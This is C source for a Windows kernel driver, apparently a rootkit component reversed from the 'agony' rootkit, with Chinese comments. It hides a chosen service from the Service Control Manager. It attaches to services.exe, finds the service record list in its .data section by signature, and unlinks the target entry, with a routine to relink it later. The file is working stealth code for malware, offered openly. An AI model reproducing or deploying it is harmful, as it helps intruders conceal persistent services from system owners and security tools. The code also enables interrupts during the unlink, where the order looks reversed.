#include <ntddk.h>
#include "struct.h"
#include "nvmini.h"
#include "HideService.h"


////////////////////////////////////////////////////////////////

PSERVICE_RECORD HiddenService[128];
ULONG NbHiddenServices=0;
PSERVICE_RECORD srecord=NULL;

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+               下面4个函数用于隐藏和恢复服务               +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --

BOOL 
IsGoodPtr (
		   PVOID ptr, 
		   ULONG size
		   )
{
	ULONG i = 0;

	for(i=0; i<size; i++) {
		if( !MmIsAddressValid( (PULONG)ptr + i) )
			return FALSE;
	}

	return TRUE;           
}

PIMAGE_SECTION_HEADER 
FindModuleSectionHdr (
  PVOID module, 
  const char *section
  )
/*++

逆向: sudami  08/02/28

参数:
  module - 模块的地址

  section - 节表的名称

功能:
  找到.data节的地址..

--*/
{
   PIMAGE_DOS_HEADER     dos;
   PIMAGE_NT_HEADERS     nth;
   PIMAGE_SECTION_HEADER sec;
   ULONG snlen, addr, i;

   if (!module)
      return NULL;

   dos     = (PIMAGE_DOS_HEADER) module;
   nth     = (PIMAGE_NT_HEADERS) (dos->e_lfanew + (char *)module);
   sec     = IMAGE_FIRST_SECTION(nth);

   snlen = strlen (section);
   for (i = 0; i < nth->FileHeader.NumberOfSections; i++, (PBYTE)sec+=sizeof(IMAGE_SECTION_HEADER)) {
       
     if (!_strnicmp (sec->Name, section, snlen)) 
      return sec; 
   }

   return NULL;
}

NTSTATUS
GetEProcessByName (
  WCHAR *processname, 
  PEPROCESS *proc
  )
/*++

逆向: sudami  08/02/28

参数:
  processname - 进程名

  proc - [OUT] 进程的EPROCESS

功能:
  原流程 --> 通过ZwQuerySystemInformation查询,得到匹配的进程ID.调用
  PsLookupProcessByProcessId得到该进程的EPROCESS.

  现流程 --> 通过ZwQuerySystemInformation查询,得到匹配的进程ID.调用
  ZwOpenProcess得到其句柄, 通过ObReferenceObjectByHandle得到EPROCESS

--*/
{
  NTSTATUS		status;
  ULONG			info_size = PAGE_SIZE;
  ULONG			result_size;
  ULONG			ProcessId = 0;
  PVOID			Object;
  ULONG			length;
  HANDLE		Services_process;
  CLIENT_ID		ClientId;
  OBJECT_ATTRIBUTES  ObjectAttributes;
  PSYSTEM_PROCESS_INFORMATION info, curr;

  *proc = NULL;
  
  while(TRUE) { // 不断的分配内存,直到调用成功
    info = ExAllocatePool (NonPagedPool, info_size);
    if (info == NULL)
		return STATUS_NO_MEMORY;
      
    status = ZwQuerySystemInformation( SystemProcessInformation, info, info_size, &result_size );  
    if( NT_SUCCESS(status) ) 
		break;
 
    if( status != STATUS_INFO_LENGTH_MISMATCH )   
		return STATUS_NO_MEMORY;

	ExFreePool(info);
    info = NULL;
    info_size += PAGE_SIZE; 
  }
    
  length = wcslen(processname);
  curr = info;
  
  do { // 遍历之,找到services.exe进程,得到其ID
      if((curr->ImageName.Length == (length * sizeof (WCHAR))) && 
          !memcmp(processname, curr->ImageName.Buffer, curr->ImageName.Length)) {

          ProcessId = curr->UniqueProcessId;
          break;
      }

	  if(curr->NextEntryOffset) {
         (PBYTE)curr  += (curr->NextEntryOffset);
	  }

  } while(curr->NextEntryOffset); 

  ExFreePool(info);

  if (!ProcessId)
	  return STATUS_NOT_FOUND;

  InitializeObjectAttributes( &ObjectAttributes, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);

  ClientId.UniqueProcess = (HANDLE)ProcessId;
  ClientId.UniqueThread  = 0;

  // 通过ID得到句柄
  status = ZwOpenProcess( &Services_process, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
  if ( !NT_SUCCESS(status) )
	  return status;

  // 通过句柄得到EPROCESS
  status = ObReferenceObjectByHandle (Services_process, PROCESS_ALL_ACCESS, NULL, KernelMode, &Object, NULL);

  ZwClose (Services_process);

  if (!NT_SUCCESS(status))
	  return status;

  *proc = (PEPROCESS)Object;
  return STATUS_SUCCESS;
}


NTSTATUS 
HideFromSCManager (
  WCHAR *service
  )
/*++

逆向: sudami  08/02/28 [add from agony]

参数:
  service - 进程名

功能:
  隐藏自身服务

--*/
{
  PPEB			peb;
  PVOID			dsec;
  ULONG			*ptr, *ptr2;
  NTSTATUS		status;
  PEPROCESS		proc;
  PSERVICE_RECORD       curr, prev=NULL, next=NULL;
  PIMAGE_SECTION_HEADER dsh; 
  PROCESS_BASIC_INFORMATION pbi;
  ULONG ServiceNameLen, ServiceToHideNameLen, dsecsize, n, i;
   
  if( NbHiddenServices >= 128 )
	  return STATUS_UNSUCCESSFUL;

  // 2次调用,得到services.exe的EPROCESS 
  status = GetEProcessByName (L"SERVICES.EXE", &proc);
  if( !NT_SUCCESS(status) ) {
    status = GetEProcessByName (L"services.exe", &proc);  
    if( !NT_SUCCESS(status) )  
       return status;
  }

  // 附着到此进程上
  KeAttachProcess (proc); 

  // 得到services.exe的进程信息
  status = ZwQueryInformationProcess(NtCurrentProcess(),
     ProcessBasicInformation, 
     &pbi, 
     sizeof(pbi), 
     0);
   
  if( !NT_SUCCESS(status) ) {
     KeDetachProcess();
     return status;    
  }
  
  // 找到其中的.data节
  peb = pbi.PebBaseAddress; 
  dsh = FindModuleSectionHdr(peb->ImageBaseAddress, ".data");                  
                                                                                  
  if( !dsh ) {
     KeDetachProcess();
     return STATUS_UNSUCCESSFUL;   
  } 

  // .data节在内存中对齐后的大小;  .data节的地址
  dsecsize = dsh->SizeOfRawData;
  dsec = dsh->VirtualAddress + (PUCHAR)peb->ImageBaseAddress;
  
  if( !srecord ) {
     for (ptr=(PULONG)dsec, n=dsecsize>>2; n ;  n--,ptr++) {
      
        if( !IsGoodPtr(ptr, 2*sizeof(ULONG)) )
           continue;

        if ( (ptr[0] == 0) && 
             (ptr[1] != 0) && 
             (ptr[1] < (ULONG)MM_HIGHEST_USER_ADDRESS) && 
             !(ptr[1]&1)) 
        {
           if( IsGoodPtr(ptr, sizeof(SERVICE_RECORD)) ) {
           
              if( !MmIsAddressValid(&((PSERVICE_RECORD)ptr[1])->sErv))
                 continue; 
           
              // 找到sErv标志  
              if( ((PSERVICE_RECORD)ptr[1])->PreviousServiceRecord == (PSERVICE_RECORD)ptr &&
                 ((PSERVICE_RECORD)ptr[1])->sErv == 'vrEs' ) {                       
                 srecord = (PSERVICE_RECORD)ptr;      
                 break;         
              } 
           }
        }  
     }     
  }

  if( !srecord ) {
     KeDetachProcess();
     return STATUS_UNSUCCESSFUL;    
  }
  
  curr = srecord;
  ServiceToHideNameLen = wcslen(service); 
  
  while( curr ) {
     if( curr->Lp_WideServiceName == NULL ) {
		 curr = curr->NextServiceRecord;
         continue;
     }   

     ServiceNameLen = wcslen( curr->Lp_WideServiceName );
     
     if(  ServiceToHideNameLen == ServiceNameLen &&
          !memcmp(curr->Lp_WideServiceName, service, (ServiceNameLen+1)*2)) {
          
           next = curr->NextServiceRecord;
           prev = curr->PreviousServiceRecord;
           
           // 隐藏服务service
           _asm sti
           
           if (next) {
			   next->PreviousServiceRecord = prev; 
		   }

		   if (prev) {
			   prev->NextServiceRecord = next;
		   }

           _asm cli 
            
           // 保存原数据,以供恢复
           HiddenService[NbHiddenServices] = curr;
           NbHiddenServices++;  
      }
      
      curr = curr->NextServiceRecord;      
  }

  KeDetachProcess();
  DbgPrint("HideFromSCManager \n");
  return status;
}

NTSTATUS
UnhideFromSCManager ()
/*++

逆向: sudami  08/02/28 [add from agony]

功能 : 
  恢复服务链表
   
--*/
{
  NTSTATUS status;
  PEPROCESS proc;
  ULONG i;
  PSERVICE_RECORD prev, next;

  if( !NbHiddenServices ) 
	  return STATUS_SUCCESS;

  status = GetEProcessByName (L"SERVICES.EXE", &proc);
  if( !NT_SUCCESS(status) ) {
    status = GetEProcessByName (L"services.exe", &proc);  
    if( !NT_SUCCESS(status) )
       return status;
  }

  KeAttachProcess(proc); 
  
  __asm cli
  for(i=0; i<NbHiddenServices; i++) {    
     
     next = HiddenService[i]->NextServiceRecord;
     prev = HiddenService[i]->PreviousServiceRecord;
           
     if( prev )
        prev->NextServiceRecord = HiddenService[i]; 
     if( next )
        next->PreviousServiceRecord = HiddenService[i];      
                
  }
  __asm sti

  KeDetachProcess();
  return status;
}
 